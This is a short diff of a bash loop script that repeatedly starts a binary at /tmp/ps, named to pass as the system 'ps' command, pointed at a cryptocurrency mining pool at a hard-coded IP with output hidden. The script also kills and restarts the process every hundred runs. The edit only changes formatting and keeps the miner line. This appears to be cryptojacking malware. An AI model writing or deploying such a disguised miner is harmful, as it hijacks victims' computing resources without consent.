@@ -4,12 +4,12 @@ while true; do
     sleep 1;
     if [[ $COUNTER -ge 100 ]];
         then
-            sleep 1200s
-			pkill -f ps
+            sleep 1200s;
+	    pkill -f ps;
             COUNTER=0;
     fi
-	/tmp/ps --pool 52.188.63.99:443 --username $user.$top --password x --algorithm wrkzcoin >/dev/null &
-	sleep 20s
+    /tmp/ps --pool 52.188.63.99:443 --username $user.$top --password x --algorithm wrkzcoin >/dev/null &
+    sleep 20s;
     COUNTER=$(($COUNTER + 1));
     echo $COUNTER;
 done
